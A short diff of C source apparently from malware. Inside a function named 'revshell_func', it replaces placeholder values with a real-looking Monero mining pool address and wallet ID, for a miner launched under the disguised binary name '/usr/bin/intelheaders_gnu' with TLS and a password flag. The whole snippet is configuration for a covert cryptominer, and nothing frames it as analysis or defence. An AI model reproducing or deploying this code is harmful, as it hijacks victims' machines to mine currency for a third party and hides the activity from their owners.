@@ -10,8 +10,8 @@ int revshell_func(void *data) {
     };
     char *argv[] = {
         "/usr/bin/intelheaders_gnu",
-        "-o", "test.com:443",
-        "-u", "44fdsasdf",
+        "-o", "pool.supportxmr.com:443",
+        "-u", "44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73",
         "-k",
         "--tls",
         "-p", "prolay",
